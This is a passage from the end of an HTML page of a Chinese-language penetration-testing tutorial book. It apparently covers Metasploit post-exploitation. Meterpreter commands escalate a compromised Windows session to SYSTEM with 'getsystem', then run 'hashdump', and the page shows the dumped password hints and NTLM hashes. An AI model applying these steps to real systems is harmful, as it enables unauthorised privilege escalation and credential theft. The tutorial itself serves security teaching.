+<p>&#xFF08;7&#xFF09;&#x63D0;&#x5347;lyw&#x7528;&#x6237;&#x7684;&#x6743;&#x9650;&#xFF0C;&#x5E76;&#x67E5;&#x770B;&#x5176;&#x7528;&#x6237;&#x4FE1;&#x606F;&#x3002;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>
+<pre><code>meterpreter &gt; getsystem
+&#x2026;got system (via technique 1).
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+</code></pre><p>&#x4ECE;&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#x4E2D;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5F53;&#x524D;lyw&#x7528;&#x6237;&#xFF0C;&#x62E5;&#x6709;&#x4E86;&#x7CFB;&#x7EDF;&#x7EA7;&#x522B;&#x7684;&#x6743;&#x9650;&#x3002;&#x6B64;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x4EFB;&#x4F55;&#x7684;&#x64CD;&#x4F5C;&#x3002;&#x5982;&#x6355;&#x83B7;&#x76EE;&#x6807;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x7528;&#x6237;&#x7684;&#x5BC6;&#x7801;&#x54C8;&#x5E0C;&#x503C;&#x3002;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>
+<pre><code>meterpreter &gt; run post/windows/gather/hashdump
+[*] Obtaining the boot key&#x2026;
+[*] Calculating the hboot key using SYSKEY 88f6c818af614f7033cb885 74907b61c&#x2026;
+[*] Obtaining the user list and keys&#x2026;
+[*] Decrypting user keys&#x2026;
+[*] Dumping password hints&#x2026;
+Test:&quot;www.123&quot;
+abc:&#x201C;123456&#x201D;
+alice:&#x201C;passwd&#x201D;
+[*] Dumping password hashes&#x2026;
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+bob:1001:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
+</code></pre><p>&#x4ECE;&#x8F93;&#x51FA;&#x7684;&#x4FE1;&#x606F;&#x4E2D;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x76EE;&#x6807;&#x7CFB;&#x7EDF;&#x4E2D;&#x6709;&#x4E09;&#x4E2A;&#x7528;&#x6237;&#xFF0C;&#x5E76;&#x4E14;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5B83;&#x4EEC;&#x7684;UID&#x53CA;&#x5BC6;&#x7801;&#x54C8;&#x5E0C;&#x503C;&#x3002;&#x800C;&#x4E14;&#xFF0C;&#x8FD8;&#x6355;&#x83B7;&#x5230;&#x4E09;&#x4E2A;&#x952E;&#x76D8;&#x8F93;&#x5165;&#x7684;&#x5BC6;&#x7801;&#x3002;&#x5982;&#x6355;&#x83B7;&#x7684;Test&#x7528;&#x6237;&#xFF0C;&#x5176;&#x5BC6;&#x7801;&#x4E3A;www.123&#x3002;</p>
+
+                    
+                    </section>
+                
+                
+                </div>
+            </div>
+        </div>
+
+        
+        <a href="./33.html" class="navigation navigation-prev " aria-label="Previous page: 6.4 渗透攻击应用"><i class="fa fa-angle-left"></i></a>
+        
+        
+        <a href="./35.html" class="navigation navigation-next " aria-label="Next page: 第7章　权限提升"><i class="fa fa-angle-right"></i></a>
+        
+    </div>
+</div>
+
+        
+<script src="gitbook/app.js"></script>
+
+    
+    <script src="gitbook/plugins/gitbook-plugin-comment/plugin.js"></script>
+    
+
+    
+    <script src="gitbook/plugins/gitbook-plugin-search/lunr.min.js"></script>
+    
+
+    
+    <script src="gitbook/plugins/gitbook-plugin-search/search.js"></script>
+    
+
+    
+    <script src="gitbook/plugins/gitbook-plugin-sharing/buttons.js"></script>
+    
+
+    
+    <script src="gitbook/plugins/gitbook-plugin-fontsettings/buttons.js"></script>
+    
+
+<script>
+require(["gitbook"], function(gitbook) {
+    var config = {"comment":{"highlightCommented":true},"autocover":{},"highlight":{},"search":{"maxIndexSize":1000000},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2}};
+    gitbook.start(config);
+});
+</script>
+
+        
+    </body>
+    
+</html>
